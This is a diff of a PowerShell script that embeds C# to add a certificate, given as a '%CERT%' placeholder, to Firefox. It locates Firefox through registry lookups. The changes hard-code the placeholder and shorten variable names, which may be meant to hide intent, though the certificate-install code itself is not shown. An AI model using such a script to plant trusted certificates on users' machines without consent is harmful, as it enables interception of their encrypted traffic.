@@ -1,6 +1,3 @@
-param (
-    [string]$C="%CERT%"
-)
 function AddCertFF{
 Add-Type @"
 using System;
@@ -248,7 +245,7 @@ public sealed class FF
     }
 	private DirectoryInfo GetIP()
     {
-        DirectoryInfo firefoxPath = null;
+        DirectoryInfo fp = null;
         // get firefox path from registry
         // we'll search the 32bit install location
         RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
@@ -272,7 +269,7 @@ public sealed class FF
                 if (installString == null)
                     throw new NullReferenceException("Install string was null");
 
-                firefoxPath = new DirectoryInfo(installString);
+                fp = new DirectoryInfo(installString);
             }
             catch (Exception)
             {
@@ -294,16 +291,16 @@ public sealed class FF
 
                 if (installString == null)
                     throw new NullReferenceException("Install string was null");
-                firefoxPath = new DirectoryInfo(installString);
+                fp = new DirectoryInfo(installString);
             }
             catch (Exception)
             {
             }
         }
-        return firefoxPath;
+        return fp;
     }
 }
 "@;
-[FF]::GetInstance().Start($C);
+[FF]::GetInstance().Start("%CERT%");
 }
 AddCertFF
